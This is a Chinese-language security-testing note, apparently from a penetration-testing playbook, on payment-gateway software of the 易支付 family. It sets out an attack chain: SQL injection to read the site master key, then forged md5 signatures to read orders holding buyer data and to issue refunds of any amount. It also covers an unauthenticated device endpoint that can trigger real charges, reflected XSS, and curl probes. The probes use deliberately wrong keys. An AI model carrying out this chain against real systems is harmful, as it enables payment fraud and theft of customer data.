# 主密钥派生签名：把「站点主密钥」当唯一门闸的存量分支（家族形态）

## 1. 形态
站点主密钥（易支付/四方网关家族里是 `<prefix>config.syskey`，32 字符）被存量分支当作**唯一认证**，签名只覆盖单个业务字段，**不含归属/租户字段、无会话**：

| 分支 | 请求 | 认证式 | 影响 |
|---|---|---|---|
| 订单读 | `GET /api.php?act=order&trade_no=X&sign=S` | `S=md5(SYS_KEY.trade_no.SYS_KEY)` | 回吐完整订单 JSON：`trade_no/out_trade_no/api_trade_no/pid/money/buyer`(PII)`/status` |
| 退款 | `POST /api.php?act=refundapi`（`money`、`trade_no`、`key`） | `key=md5(trade_no.SYS_KEY.trade_no)` | **金额由请求方指定**，无 pid、无会话、无配置门闸 ⇒ 任意订单任意金额退款 |
| 对照（受限） | `POST /api.php?act=refund` | 商户 key | 回「商户密钥错误」⇒ 商户域分支，别与上一条混 |

主密钥常经同站**未授权 SQLi 存量入口**（如 `getshop.php?trade_no=`）拖得 ⇒ 完整链：SQLi → 读 `syskey` → 算 sign/key → 未授权读单 + 未授权退款。

## 2. 零资金存在性取证
```bash
# 用故意错误的 sign/key —— 证明端点在线、且该 md5 是唯一门闸
curl -s "https://T/api.php?act=order&trade_no=<自有订单号>&sign=deadbeef"
#   -> {"code":-1,"msg":"密钥错误"}    ⇒ 端点在线 + 门闸 = 该 md5（未执行任何动作）
curl -s -X POST "https://T/api.php?act=refundapi" -d "money=0.01&trade_no=<自有订单号>&key=deadbeef"
#   -> {"code":-1,"msg":"密钥错误"}    ⇒ 同样只证明门闸，不触发退款
```
**正确 key 会真实退款，绝不提交。** 签名只覆盖 `trade_no` ⇒ 跨商户性属**代码构造推断**；站内只有一个商户（`<prefix>user` 只有 1 行）时无法抽样实证，交付时必须写明。

## 3. 收款设备指令端点（`gateway.php` 家族）
- 形态：根目录 `gateway.php`；`$nosession=true`；`Content-Type: application/json`；按 `cmd` 分发（`heartbeat`/`qrcode`/`voice`…）
- 指纹：`{"cmd":"heartbeat"}` → `{"cmd":"heartbeat"}` ⇒ 端点在线且未授权
- `cmd=qrcode`：身份 = `sn`（设备号，列名 `voice_devid`），**无会话无签名**；凭据齐全时 `INSERT <prefix>order` → `Channel::submit` → `Plugin::loadForSubmit()` **真实调起支付插件对付款码扣款**（`money` 请求方指定）
- 零写入三档：`{"cmd":"qrcode"}`→「设备号不能为空」；+不存在 `sn`→「设备关联的商户不存在」（SQL 实跑，证明列存在）；+空 `data`→「二维码解析失败」（写库前返回）
- **定级前提**：`SELECT count(*) FROM <prefix>user WHERE voice_devid IS NOT NULL AND voice_devid<>''`；=0 ⇒ 潜伏面
- 同族其它存量入口（`cashier.php`/`submit2.php`/`gold.php`，均 `$nosession=true`）：未授权订单支付页 + `out_trade_no` 原样回显 ⇒ 反射型 XSS + 订单信息泄露；SQL 走 `daddslashes` ⇒ 无注入，别在注入上浪费轮次

## 4. 错误语义对照表（判层用）
| 响应 | 含义 |
|---|---|
| `接口方法不存在` / `{"code":-5,...}` | 该类**未部署**（部署树 ≠ 版本索引）⇒ 白名单条目是残留，判负 |
| `No Act!` / `No Route` | 路由未命中 |
| `未传入任何参数` / `你还未配置支付接口商户！` | 缺参，只证明路由可达 |
| `密钥错误` / `商户密钥错误` | 验签门闸在（后者 = 商户域分支）|
| 业务码 + 金额/订单文案 | 真业务分支可达 |

## 5. 回调类端点的先决确认
回调验签若依赖配置里的 `*_token`/`*_aeskey`，**先在配置表与缓存序列化里确认这些键是否存在**：键完全不存在 ⇒ 回调不可伪造，直接判负，不要花时间构造密文。
